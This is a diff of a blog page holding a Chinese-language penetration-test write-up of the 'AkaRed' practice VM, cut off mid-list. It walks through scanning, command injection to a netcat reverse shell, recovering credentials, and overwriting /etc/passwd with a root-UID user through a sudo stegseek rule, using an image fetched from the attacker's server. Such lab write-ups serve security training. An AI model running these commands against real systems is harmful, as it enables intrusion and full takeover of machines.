@@ -32,7 +32,7 @@
 <meta property="og:url" content="https://7r1UMPH.github.io/post/shen-tou-ce-shi-bao-gao-%20-%20AkaRed%20%28-ce-shi-ba-ji-%29.html">
 <meta property="og:image" content="https://7r1umph.top/image/202506121404919.webp">
 <title>渗透测试报告 - AkaRed (测试靶机)</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -107,27 +107,26 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <p>此阶段旨在发现目标并了解其开放的服务。</p>
 <h3>1.1. 网络发现 (Network Discovery)</h3>
 <p>使用 <code class="notranslate">arp-scan</code> 在本地网络中探测存活主机，因为它通过 ARP 请求进行扫描，通常比 IP/端口扫描更快且不易被防火墙拦截。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ sudo arp-scan -l # -l 表示扫描本地网络
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ sudo arp-scan -l <span class="pl-c"><span class="pl-c">#</span> -l 表示扫描本地网络</span>
 
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
-# ... (其他主机) ...
-192.168.205.185 08:00:27:3b:24:68       PCS Systemtechnik GmbH  # &lt;-- 发现目标
-# ... (其他主机) ...
+<span class="pl-c"><span class="pl-c">#</span> ... (其他主机) ...</span>
+192.168.205.185 08:00:27:3b:24:68       PCS Systemtechnik GmbH  <span class="pl-c"><span class="pl-c">#</span> &lt;-- 发现目标</span>
+<span class="pl-c"><span class="pl-c">#</span> ... (其他主机) ...</span>
 
-Ending arp-scan 1.10.0: 256 hosts scanned in 2.036 seconds (125.74 hosts/sec). 4 responded
-</code></pre>
+Ending arp-scan 1.10.0: 256 hosts scanned <span class="pl-k">in</span> 2.036 seconds (125.74 hosts/sec). 4 responded</pre></div>
 <p>目标主机 IP 确定为 <code class="notranslate">192.168.205.185</code>。MAC 地址 <code class="notranslate">08:00:27:3b:24:68</code> 对应的厂商 <code class="notranslate">PCS Systemtechnik GmbH</code> 通常与 Oracle VirtualBox 相关联。</p>
 <h3>1.2. 端口扫描 (Port Scanning)</h3>
 <p>使用 <code class="notranslate">nmap</code> 对目标进行端口扫描，识别开放的 TCP 端口及运行的服务。</p>
 <ul>
 <li>
 <p>首先进行全端口扫描 (<code class="notranslate">-p-</code>)，确保不遗漏任何可能开放的端口。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nmap -p- 192.168.205.185    
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 20:21 CST
-Nmap scan report for 192.168.205.185
+Nmap scan report <span class="pl-k">for</span> 192.168.205.185
 Host is up (0.00016s latency).
 Not shown: 65533 closed tcp ports (reset)
 PORT   STATE SERVICE
@@ -135,68 +134,63 @@ PORT   STATE SERVICE
 80/tcp open  http
 MAC Address: 08:00:27:3B:24:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
-Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
-</code></pre>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.28 seconds</pre></div>
 </li>
 <li>
 <p>针对已发现的端口进行更详细的服务版本探测。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nmap -p22,80 -sV 192.168.205.185
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 20:21 CST
-Nmap scan report for 192.168.205.185
+Nmap scan report <span class="pl-k">for</span> 192.168.205.185
 Host is up (0.00027s latency).
 
 PORT   STATE SERVICE    VERSION
 22/tcp open  tcpwrapped
-80/tcp open  http       Apache httpd 2.4.59 ((Debian))
+80/tcp open  http       Apache httpd 2.4.59 <span class="pl-s"><span class="pl-pds">((</span>Debian<span class="pl-pds">))</span></span>
 MAC Address: 08:00:27:3B:24:68 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
-</code></pre>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 6.58 seconds</pre></div>
 <p>扫描结果确认端口 22 (SSH) 和 80 (HTTP) 开放。</p>
 </li>
 </ul>
 <h3>1.3. Web 服务探测 (Web Enumeration)</h3>
 <p>使用 <code class="notranslate">curl</code> 检查 80 端口的 HTTP 服务，获取网页内容。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ curl 192.168.205.185
-&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;CyberPing 2077&lt;/title&gt;
-    &lt;!-- ... CSS (已省略) ... --&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;div class="container"&gt;
-        &lt;h1 class="glitch"&gt;⮟ CYBERPING 2077 ⮟&lt;/h1&gt;
-        &lt;form method="post"&gt;
-            &lt;input type="text" name="ip" placeholder="Enter target IP/command" required&gt;
-            &lt;button type="submit"&gt;Execute Command&lt;/button&gt;
-        &lt;/form&gt;
-    &lt;/div&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
+<span class="pl-k">&lt;</span><span class="pl-k">!</span>DOCTYPE html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>html<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>head<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>title<span class="pl-k">&gt;</span>CyberPing <span class="pl-k">2077&lt;</span>/title<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span><span class="pl-k">!</span>-- ... CSS (已省略) ... --<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/head<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>body<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>container<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>h1 class=<span class="pl-s"><span class="pl-pds">"</span>glitch<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>⮟ CYBERPING 2077 ⮟<span class="pl-k">&lt;</span>/h<span class="pl-k">1&gt;</span>
+        <span class="pl-k">&lt;</span>form method=<span class="pl-s"><span class="pl-pds">"</span>post<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+            <span class="pl-k">&lt;</span>input type=<span class="pl-s"><span class="pl-pds">"</span>text<span class="pl-pds">"</span></span> name=<span class="pl-s"><span class="pl-pds">"</span>ip<span class="pl-pds">"</span></span> placeholder=<span class="pl-s"><span class="pl-pds">"</span>Enter target IP/command<span class="pl-pds">"</span></span> required<span class="pl-k">&gt;</span>
+            <span class="pl-k">&lt;</span>button type=<span class="pl-s"><span class="pl-pds">"</span>submit<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>Execute Command<span class="pl-k">&lt;</span>/button<span class="pl-k">&gt;</span>
+        <span class="pl-k">&lt;</span>/form<span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/body<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span></pre></div>
 <p>网页标题为 "CyberPing 2077"，包含一个表单，输入框 <code class="notranslate">name="ip"</code> 且提示为 "Enter target IP/command"。这极有可能是一个允许用户输入 IP 地址执行 <code class="notranslate">ping</code> 命令的功能，并且存在命令注入的风险。</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4f1bcec28821f433ead0aba72336eec88ce85cebd8bd8da3c102d7399ccbc56f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303431313230323235393938312e706e67"><img src="https://camo.githubusercontent.com/4f1bcec28821f433ead0aba72336eec88ce85cebd8bd8da3c102d7399ccbc56f/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303431313230323235393938312e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250411202259981.png" style="max-width: 100%;"></a></p>
 <h2>2. 获取初始访问权限 (Initial Access - Command Injection)</h2>
 <p>此阶段利用 Web 应用的漏洞获取目标服务器的 Shell。</p>
 <h3>2.1. 确认漏洞 (Confirming Vulnerability)</h3>
 <p>为验证命令注入，我们在 Web 表单中输入攻击者的 IP 地址 <code class="notranslate">192.168.205.128</code>，并期望目标服务器执行 <code class="notranslate">ping 192.168.205.128</code>。同时，在攻击者机器上启动 <code class="notranslate">tcpdump</code> 监听 ICMP 流量。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ sudo tcpdump -A -n icmp
-# -A: 以 ASCII 打印报文内容
-# -n: 不解析主机名
-# icmp: 只捕获 ICMP 协议流量
-tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
-listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> -A: 以 ASCII 打印报文内容</span>
+<span class="pl-c"><span class="pl-c">#</span> -n: 不解析主机名</span>
+<span class="pl-c"><span class="pl-c">#</span> icmp: 只捕获 ICMP 协议流量</span>
+tcpdump: verbose output suppressed, use -v[v]... <span class="pl-k">for</span> full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</pre></div>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a9f0dafc631217c38a03f744713fd27f601710c184c31085e6ff1bef8c4821a0/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303431313230323335373638362e706e67"><img src="https://camo.githubusercontent.com/a9f0dafc631217c38a03f744713fd27f601710c184c31085e6ff1bef8c4821a0/68747470733a2f2f63646e2e6a7364656c6976722e6e65742f67682f377231554d50482f377231554d50482e6769746875622e696f406d61696e2f7374617469632f696d6167652f32303235303431313230323335373638362e706e67" alt="" data-canonical-src="https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250411202357686.png" style="max-width: 100%;"></a></p>
 <p>在 Web 页面提交 IP 后，<code class="notranslate">tcpdump</code> 捕获到来自目标 IP 的 ICMP 请求：</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">20:23:39.932006 IP 192.168.205.185 &gt; 192.168.205.128: ICMP echo request, id 1016, seq 1, length 64
-# ... (其他 ICMP 请求和响应) ... 
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">20:23:39.932006 IP 192.168.205.185 <span class="pl-k">&gt;</span> 192.168.205.128: ICMP <span class="pl-c1">echo</span> request, id 1016, seq 1, length 64
+<span class="pl-c"><span class="pl-c">#</span> ... (其他 ICMP 请求和响应) ... </span></pre></div>
 <p>这证实了 Web 应用确实执行了用户输入的命令（至少是 <code class="notranslate">ping</code>），存在命令注入漏洞。</p>
 <h3>2.2. 漏洞利用 (Exploitation - Reverse Shell)</h3>
 <p>利用命令注入点执行一个反向 Shell Payload。使用分号 <code class="notranslate">;</code> 作为命令分隔符，先结束可能存在的 <code class="notranslate">ping</code> 命令，然后执行 <code class="notranslate">netcat</code> 命令将目标服务器的 <code class="notranslate">/bin/bash</code> Shell 反弹回攻击者机器。</p>
@@ -209,40 +203,37 @@ listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
 </li>
 <li>
 <p><strong>攻击者监听:</strong> 在 Kali 上使用 <code class="notranslate">netcat</code> 监听 8888 端口。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nc -lvnp 8888
-# -l: 监听模式
-# -v: 详细输出
-# -n: 不解析主机名
-# -p 8888: 指定监听端口
-listening on [any] 8888 ...
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> -l: 监听模式</span>
+<span class="pl-c"><span class="pl-c">#</span> -v: 详细输出</span>
+<span class="pl-c"><span class="pl-c">#</span> -n: 不解析主机名</span>
+<span class="pl-c"><span class="pl-c">#</span> -p 8888: 指定监听端口</span>
+listening on [any] 8888 ...</pre></div>
 </li>
 <li>
 <p><strong>获取 Shell:</strong> 在 Web 页面提交 Payload 后，攻击者的 <code class="notranslate">nc</code> 监听器接收到连接。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">connect to [192.168.205.128] from (UNKNOWN) [192.168.205.185] 56366
-# 此时已获得目标服务器 Shell，用户为 www-data
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">connect to [192.168.205.128] from (UNKNOWN) [192.168.205.185] 56366
+<span class="pl-c"><span class="pl-c">#</span> 此时已获得目标服务器 Shell，用户为 www-data</span></pre></div>
 <p>成功获取了运行 Web 服务器的用户 (<code class="notranslate">www-data</code>) 的 Shell。</p>
 </li>
 </ul>
 <h3>2.3. Shell 升级 (Shell Upgrade)</h3>
 <p>初始获得的 Shell 通常是非交互式的，功能受限（如没有 Tab 补全、无法运行 <code class="notranslate">sudo</code> 等）。需要升级为功能完整的 TTY。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate"># 在目标 Shell 中执行:
-$ script /dev/null -c bash   # 使用 script 创建一个伪终端
-# 按下 Ctrl+Z 将其置于后台
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在目标 Shell 中执行:</span>
+$ script /dev/null -c bash   <span class="pl-c"><span class="pl-c">#</span> 使用 script 创建一个伪终端</span>
+<span class="pl-c"><span class="pl-c">#</span> 按下 Ctrl+Z 将其置于后台</span>
 
-# 在攻击者 Kali 终端中执行:
+<span class="pl-c"><span class="pl-c">#</span> 在攻击者 Kali 终端中执行:</span>
 ┌──(kali㉿kali)-[~]
-└─$ stty raw -echo; fg      # 设置本地终端模式，并将后台任务调回前台
-# 按两次 Enter 键
+└─$ stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>      <span class="pl-c"><span class="pl-c">#</span> 设置本地终端模式，并将后台任务调回前台</span>
+<span class="pl-c"><span class="pl-c">#</span> 按两次 Enter 键</span>
 
-# 回到目标 Shell 中执行:
-reset xterm                  # 重置终端类型
-export TERM=xterm            # 设置终端环境变量
-export SHELL=/bin/bash       # 设置 SHELL 环境变量
-stty rows 59 cols 236      # (可选) 设置终端尺寸以匹配本地终端
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> 回到目标 Shell 中执行:</span>
+reset xterm                  <span class="pl-c"><span class="pl-c">#</span> 重置终端类型</span>
+<span class="pl-k">export</span> TERM=xterm            <span class="pl-c"><span class="pl-c">#</span> 设置终端环境变量</span>
+<span class="pl-k">export</span> SHELL=/bin/bash       <span class="pl-c"><span class="pl-c">#</span> 设置 SHELL 环境变量</span>
+stty rows 59 cols 236      <span class="pl-c"><span class="pl-c">#</span> (可选) 设置终端尺寸以匹配本地终端</span></pre></div>
 <p>现在拥有了一个功能更完善的交互式 Shell。</p>
 <h2>3. 权限提升 (www-data -&gt; welcome)</h2>
 <p>此阶段目标是从 <code class="notranslate">www-data</code> 用户提升到权限更高的用户。</p>
@@ -250,91 +241,82 @@ stty rows 59 cols 236      # (可选) 设置终端尺寸以匹配本地终端
 <ul>
 <li>
 <p><strong>Web 目录探索:</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">www-data@AkaRed:/var/www/html$ ls -al
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/var/www/html$ ls -al
 total 16
-# ...
--rw-r--r-- 1 root root   21 Apr 11 06:26 robots.txt
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> ...</span>
+-rw-r--r-- 1 root root   21 Apr 11 06:26 robots.txt</pre></div>
 <p>发现 <code class="notranslate">robots.txt</code> 文件。</p>
 </li>
 <li>
 <p><strong>检查 <code class="notranslate">robots.txt</code>:</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">www-data@AkaRed:/var/www/html$ cat robots.txt 
-d2VsY29tZTpha2FyZWQ=
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/var/www/html$ cat robots.txt 
+d2VsY29tZTpha2FyZWQ=</pre></div>
 <p>这是一串 Base64 编码的字符串。</p>
 </li>
 <li>
 <p><strong>解码 Base64:</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">www-data@AkaRed:/var/www/html$ echo 'd2VsY29tZTpha2FyZWQ=' | base64 -d
-welcome:akared
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/var/www/html$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>d2VsY29tZTpha2FyZWQ=<span class="pl-pds">'</span></span> <span class="pl-k">|</span> base64 -d
+welcome:akared</pre></div>
 <p>解码得到凭据 <code class="notranslate">welcome:akared</code>。尝试使用此凭据 <code class="notranslate">su welcome</code>，但根据后续操作判断，此密码 <strong>不正确</strong> 。</p>
 </li>
 <li>
 <p><strong>检查家目录:</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">www-data@AkaRed:/var/www/html$ ls /home/
-welcome
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/var/www/html$ ls /home/
+welcome</pre></div>
 <p>确认存在用户 <code class="notranslate">welcome</code>。</p>
 </li>
 <li>
 <p><strong>检查 <code class="notranslate">/opt</code> 目录:</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">www-data@AkaRed:/opt$ ls -al
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/opt$ ls -al
 total 32
-# ...
--rwxr-xr-x  1 root root 16912 Apr 11 06:41 showmepassword
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> ...</span>
+-rwxr-xr-x  1 root root 16912 Apr 11 06:41 showmepassword</pre></div>
 <p>发现一个名为 <code class="notranslate">showmepassword</code> 的可执行文件。</p>
 </li>
 <li>
 <p><strong>运行 <code class="notranslate">showmepassword</code>:</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">www-data@AkaRed:/opt$ ./showmepassword 
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/opt$ ./showmepassword 
 input to /tmp/xxoo
 when input 1000 count. u will get password.
-now it is 1 count.
-</code></pre>
+now it is 1 count.</pre></div>
 <p>程序提示需要运行 1000 次才能获得密码。</p>
 </li>
 <li>
 <p><strong>编写脚本运行 1000 次:</strong></p>
-<pre lang="bash" class="notranslate"><code class="notranslate">www-data@AkaRed:/opt$ for i in {1..1000}; do ./showmepassword; done
-# ... (大量输出省略) ...
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/opt$ <span class="pl-k">for</span> <span class="pl-smi">i</span> <span class="pl-k">in</span> {1..1000}<span class="pl-k">;</span> <span class="pl-k">do</span> ./showmepassword<span class="pl-k">;</span> <span class="pl-k">done</span>
+<span class="pl-c"><span class="pl-c">#</span> ... (大量输出省略) ...</span>
 input to /tmp/xxoo
 when input 1000 count. u will get password.
 now it is 998 count.
 input to /tmp/xxoo
 when input 1000 count. u will get password.
-d2VsY2  # &lt;-- 获取到密码片段
+d2VsY2  <span class="pl-c"><span class="pl-c">#</span> &lt;-- 获取到密码片段</span>
 input to /tmp/xxoo
 when input 1000 count. u will get password.
 d2VsY2
 input to /tmp/xxoo
 when input 1000 count. u will get password.
-d2VsY2
-</code></pre>
+d2VsY2</pre></div>
 <p>在接近 1000 次时，程序输出了字符串 <code class="notranslate">d2VsY2</code>。这很可能是 <code class="notranslate">welcome</code> 用户的密码。</p>
 </li>
 </ul>
 <h3>3.2. 切换用户 (Switching User)</h3>
 <p>使用从 <code class="notranslate">showmepassword</code> 获取的密码 <code class="notranslate">d2VsY2</code> 尝试切换到 <code class="notranslate">welcome</code> 用户。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">www-data@AkaRed:/opt$ su welcome
-Password: &lt;在此输入 'd2VsY2'&gt;
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@AkaRed:/opt$ su welcome
+Password: <span class="pl-k">&lt;</span>在此输入 <span class="pl-s"><span class="pl-pds">'</span>d2VsY2<span class="pl-pds">'</span></span><span class="pl-k">&gt;</span>
 welcome@AkaRed:/opt$ id
-uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
-</code></pre>
+uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)</pre></div>
 <p>成功切换到 <code class="notranslate">welcome</code> 用户。</p>
 <h2>4. 权限提升 (welcome -&gt; root)</h2>
 <p>此阶段目标是从 <code class="notranslate">welcome</code> 用户提升到 <code class="notranslate">root</code> 用户。</p>
 <h3>4.1. 以 welcome 身份进行信息收集 (Enumeration as welcome)</h3>
 <p>检查 <code class="notranslate">welcome</code> 用户的 <code class="notranslate">sudo</code> 权限。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">welcome@AkaRed:/opt$ sudo -l
-Matching Defaults entries for welcome on AkaRed:
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@AkaRed:/opt$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> welcome on AkaRed:
     env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
 User welcome may run the following commands on AkaRed:
-    (ALL : ALL) NOPASSWD: /usr/local/bin/stegseek
-</code></pre>
+    (ALL <span class="pl-c1">:</span> ALL) NOPASSWD: /usr/local/bin/stegseek</pre></div>
 <p>关键发现：用户 <code class="notranslate">welcome</code> 可以 <strong>无需密码</strong> (<code class="notranslate">NOPASSWD</code>) 以 <strong>任何用户</strong> (<code class="notranslate">ALL : ALL</code>) 的身份运行 <code class="notranslate">/usr/local/bin/stegseek</code> 命令。<code class="notranslate">stegseek</code> 是一个用于破解 <code class="notranslate">steghide</code> 隐写密码并提取隐藏文件的工具。其 <code class="notranslate">-xf &lt;outfile&gt;</code> 选项允许将提取的文件写入指定路径，这是一个潜在的提权向量。</p>
 <h3>4.2. 利用策略 (Exploitation Strategy)</h3>
 <p>利用 <code class="notranslate">sudo stegseek</code> 的 <code class="notranslate">-xf</code> 选项覆盖 <code class="notranslate">/etc/passwd</code> 文件，从而添加一个自定义的 root 用户。</p>
@@ -363,80 +345,71 @@ User welcome may run the following commands on AkaRed:
 <li>创建一个新用户 <code class="notranslate">a</code>，UID 和 GID 均为 0 (root 权限)。</li>
 <li>设置一个已知的密码哈希。这里使用 <code class="notranslate">$1$user3$rAGRVf5p2jYTqtqOW5cPu/</code> (假设攻击者知道其对应的明文密码，例如 'pass123')。</li>
 </ul>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ echo 'a:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/bash' &gt; malicious_passwd 
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>a:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> malicious_passwd </pre></div>
 </li>
 <li>
 <p><strong>准备载体图片 (<code class="notranslate">1.jpg</code>)</strong>:</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ cp ~/Pictures/1.jpg . # 复制一个任意的 JPG 图片
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ cp <span class="pl-k">~</span>/Pictures/1.jpg <span class="pl-c1">.</span> <span class="pl-c"><span class="pl-c">#</span> 复制一个任意的 JPG 图片</span></pre></div>
 </li>
 <li>
 <p><strong>使用 <code class="notranslate">steghide</code> 嵌入数据</strong>:</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ steghide embed -ef malicious_passwd -cf 1.jpg -p "123456" 
-# -ef: 指定要嵌入的文件
-# -cf: 指定载体文件
-# -p: 设置嵌入/提取密码
-embedding "malicious_passwd" in "1.jpg"... done
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ steghide embed -ef malicious_passwd -cf 1.jpg -p <span class="pl-s"><span class="pl-pds">"</span>123456<span class="pl-pds">"</span></span> 
+<span class="pl-c"><span class="pl-c">#</span> -ef: 指定要嵌入的文件</span>
+<span class="pl-c"><span class="pl-c">#</span> -cf: 指定载体文件</span>
+<span class="pl-c"><span class="pl-c">#</span> -p: 设置嵌入/提取密码</span>
+embedding <span class="pl-s"><span class="pl-pds">"</span>malicious_passwd<span class="pl-pds">"</span></span> <span class="pl-k">in</span> <span class="pl-s"><span class="pl-pds">"</span>1.jpg<span class="pl-pds">"</span></span>... <span class="pl-k">done</span></pre></div>
 </li>
 <li>
 <p><strong>启动 HTTP 服务器托管图片</strong>:</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ python3 -m http.server 80 # 在 80 端口启动简单 HTTP 服务器                                                                    
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ python3 -m http.server 80 <span class="pl-c"><span class="pl-c">#</span> 在 80 端口启动简单 HTTP 服务器                                                                    </span>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre></div>
 </li>
 </ol>
 <h3>4.4. 执行利用代码 (Target Machine)</h3>
 <ol>
 <li>
 <p><strong>切换到可写目录并下载图片</strong>: <code class="notranslate">/tmp</code> 通常是所有用户都可写的目录。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">welcome@AkaRed:/opt$ cd /tmp
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@AkaRed:/opt$ <span class="pl-c1">cd</span> /tmp
 welcome@AkaRed:/tmp$ wget http://192.168.205.128/1.jpg
-# ... (下载输出) ...
-2025-04-11 08:29:34 (220 MB/s) - ‘1.jpg’ saved [396237/396237]
-</code></pre>
+<span class="pl-c"><span class="pl-c">#</span> ... (下载输出) ...</span>
+2025-04-11 08:29:34 (220 MB/s) - ‘1.jpg’ saved [396237/396237]</pre></div>
 </li>
 <li>
 <p><strong>创建密码文件 (<code class="notranslate">1</code>)</strong>:</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">welcome@AkaRed:/tmp$ echo '123456' &gt; 1
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@AkaRed:/tmp$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>123456<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> 1</pre></div>
 </li>
 <li>
 <p><strong>执行 <code class="notranslate">sudo stegseek</code> 覆盖 <code class="notranslate">/etc/passwd</code></strong>:</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">welcome@AkaRed:/tmp$ sudo /usr/local/bin/stegseek 1.jpg 1 -xf /etc/passwd
-# &lt;image_file&gt;: 载体图片
-# &lt;password_file&gt;: 包含密码的字典文件
-# -xf /etc/passwd: 将提取的文件强制写入 /etc/passwd
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@AkaRed:/tmp$ sudo /usr/local/bin/stegseek 1.jpg 1 -xf /etc/passwd
+<span class="pl-c"><span class="pl-c">#</span> &lt;image_file&gt;: 载体图片</span>
+<span class="pl-c"><span class="pl-c">#</span> &lt;password_file&gt;: 包含密码的字典文件</span>
+<span class="pl-c"><span class="pl-c">#</span> -xf /etc/passwd: 将提取的文件强制写入 /etc/passwd</span>
 StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
    
-[i] Found passphrase: "123456"
-[i] Original filename: "malicious_passwd".
-[i] Extracting to "/etc/passwd".
-the file "/etc/passwd" does already exist. overwrite ? (y/n) 
-y # 确认覆盖
-</code></pre>
+[i] Found passphrase: <span class="pl-s"><span class="pl-pds">"</span>123456<span class="pl-pds">"</span></span>
+[i] Original filename: <span class="pl-s"><span class="pl-pds">"</span>malicious_passwd<span class="pl-pds">"</span></span>.
+[i] Extracting to <span class="pl-s"><span class="pl-pds">"</span>/etc/passwd<span class="pl-pds">"</span></span>.
+the file <span class="pl-s"><span class="pl-pds">"</span>/etc/passwd<span class="pl-pds">"</span></span> does already exist. overwrite <span class="pl-k">?</span> (y/n) 
+y <span class="pl-c"><span class="pl-c">#</span> 确认覆盖</span></pre></div>
 </li>
 <li>
